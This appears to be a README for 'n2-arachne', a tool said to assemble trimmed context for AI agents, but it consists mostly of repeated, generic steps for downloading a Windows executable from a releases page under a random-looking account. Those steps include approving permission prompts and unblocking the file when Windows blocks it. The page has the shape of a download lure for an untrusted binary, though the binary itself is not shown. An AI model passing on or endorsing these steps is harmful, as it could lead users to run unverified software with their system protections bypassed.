# 🧠 n2-arachne - Fit AI context without noise

[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Genealogic-verticalfile126/n2-arachne/releases)

## 📥 Download n2-arachne

Visit this page to download: https://github.com/Genealogic-verticalfile126/n2-arachne/releases

1. Open the release page in your browser.
2. Find the latest release at the top.
3. Download the Windows file for your PC.
4. Save the file to your Downloads folder.
5. Open the file to start the setup or app.

If the release page gives you more than one file, choose the one for Windows. It is often named with `.exe` or `.zip`.

## 🪟 Run on Windows

1. After the download finishes, open File Explorer.
2. Go to the folder where the file was saved.
3. If you downloaded an `.exe` file, double-click it.
4. If you downloaded a `.zip` file, right-click it and select Extract All.
5. Open the extracted folder and start the app.

If Windows asks for permission, choose Yes.

## ✨ What n2-arachne does

n2-arachne helps you build a clean AI work context from large sets of files and notes. It picks the parts that matter and leaves out extra noise. That makes it easier to work with tools that use a limited context window.

It is made for:

- AI agents that need focused input
- Code context assembly
- Large projects with many files
- LLM workflows that need tighter prompts
- Teams that want fast, repeatable setup

## 🧩 How it helps

When you work with AI tools, the model can only take in so much text at once. n2-arachne helps by organizing what goes in.

It can help with:

- Tree views of a project
- Target files that matter most
- Dependency files that support the task
- Semantic context that gives meaning
- Smaller prompts with less clutter

This keeps the input useful and easier to manage.

## 🖥️ System needs

Use a Windows PC with:

- Windows 10 or Windows 11
- At least 4 GB of RAM
- 200 MB of free disk space
- Internet access for the first download
- A standard keyboard and mouse

For larger projects, 8 GB of RAM or more gives better room for the app and other tools.

## 🛠️ Setup steps

1. Download the latest release from the release page.
2. Open the file in Windows.
3. Follow the setup screen if one appears.
4. Choose a folder you can find again, such as Downloads or Desktop.
5. Finish the install or extraction step.
6. Open the app from the folder or from the Start menu.

If the app starts from a folder, keep the folder in place. Moving files can break shortcuts.

## 📂 Basic use

1. Open n2-arachne.
2. Pick the project or folder you want to work with.
3. Let it scan the files and map the structure.
4. Choose the files or sections you want to include.
5. Build the final context package.
6. Copy or send that output to your AI tool.

Use small inputs when you can. Add only the files that matter for the task.

## 🔎 Best ways to use it

Use n2-arachne for tasks like:

- Summarizing a codebase
- Preparing context for an AI coding assistant
- Finding the key files for a bug fix
- Collecting related files before asking for help
- Reducing input size before sending data to an LLM

If you work with many files, start with the main entry files, then add only the needed support files.

## 🗄️ Data and storage

n2-arachne uses local storage for project data and cache files. This helps it keep your setup quick on repeat runs.

You may see files tied to:

- Project scans
- Saved settings
- Context output
- Local indexes
- SQLite data files

Keep these files together unless the app says otherwise.

## ⚙️ Common file types

You may see these during download or use:

- `.exe` for Windows install or launch
- `.zip` for manual extraction
- `.sqlite` or `.db` for local data
- Text files for notes or output
- Config files for saved settings

If you are not sure which file to open, start with the Windows `.exe` or the extracted app folder from a `.zip` file.

## 🧭 First-time checklist

- Download the latest release
- Open the Windows file
- Finish install or extraction
- Launch the app
- Choose a project folder
- Build a small test context
- Check that the output looks right

If the output feels too large, remove extra files and try again.

## 🧠 Tips for better results

- Start with one folder, not the whole drive
- Use the smallest set of files that answer the task
- Keep names clear in your project folders
- Rebuild context when files change
- Save useful presets if the app supports them

For AI work, clean input usually beats large input.

## 🧪 Example workflow

1. Open your project folder.
2. Let n2-arachne scan the tree.
3. Mark the main file you want help with.
4. Add related files that affect it.
5. Include dependency files if needed.
6. Export the result and paste it into your AI tool.

This gives the model the parts it needs without extra text.

## 🧰 Troubleshooting

If the app does not open:

- Check that the download finished
- Make sure you opened the Windows file
- Try running it again as your user
- Re-extract the `.zip` file if you used one
- Move the folder to a simple path like `C:\n2-arachne`

If the app opens but shows no files:

- Check that you selected the right folder
- Make sure the folder has readable files
- Try a smaller project first

If Windows blocks the file:

- Right-click the file
- Open Properties
- If you see an unblock option, allow it
- Try opening it again

## 📦 Release page

Download from the release page: https://github.com/Genealogic-verticalfile126/n2-arachne/releases

## 🧭 Project focus

n2-arachne is built for:

- ai-agents
- context-assembly
- context-window management
- developer-tools
- llm-optimization
- mcp-based workflows
- sqlite-backed local data

It keeps the work centered on the files that matter most for the task at hand

## 📁 Recommended folder layout

A simple setup works best:

- `C:\n2-arachne\app`
- `C:\n2-arachne\projects`
- `C:\n2-arachne\output`

This makes it easier to find files and keep scans in one place.

## ⌨️ Short guide for daily use

1. Open the app
2. Select a project folder
3. Scan files
4. Pick the target
5. Add support files
6. Export the context
7. Paste it into your AI tool